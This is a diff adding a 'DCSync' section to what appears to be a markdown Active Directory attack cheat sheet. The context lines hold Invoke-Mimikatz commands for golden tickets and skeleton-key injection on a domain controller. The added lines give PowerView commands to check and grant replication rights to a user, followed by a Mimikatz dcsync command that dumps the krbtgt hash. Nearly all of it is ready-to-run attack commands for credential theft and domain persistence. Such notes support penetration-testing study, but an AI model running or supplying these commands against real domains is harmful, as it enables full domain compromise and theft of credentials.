@@ -221,3 +221,12 @@ Invoke-Mimikatz -Command '"kerberos::golden /domain:corporate.corp.local /sid:S-
 ```
 Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'-ComputerName dcorp-dc.corporate.corp.local    #Command to inject a skeleton key
 ```
+
+# DCSync
+
+- **With PowerView and Invoke-Mimikatz:**
+```
+Get-ObjectAcl -DistinguishedName "dc=corporate,dc=corp,dc=local" -ResolveGUIDs | ? {($_.IdentityReference -match "user01") -and (($_.ObjectType -match 'replication') -or ($_.ActiveDirectoryRights -match 'GenericAll'))}  #Check if user01 has these permissions
+Add-ObjectAcl -TargetDistinguishedName "dc=corporate,dc=corp,dc=local" -PrincipalSamAccountName user01 -Rights DCSync -Verbose  #If you are a domain admin, you can grant this permissions to any user
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'  #Gets the hash of krbtgt
+```
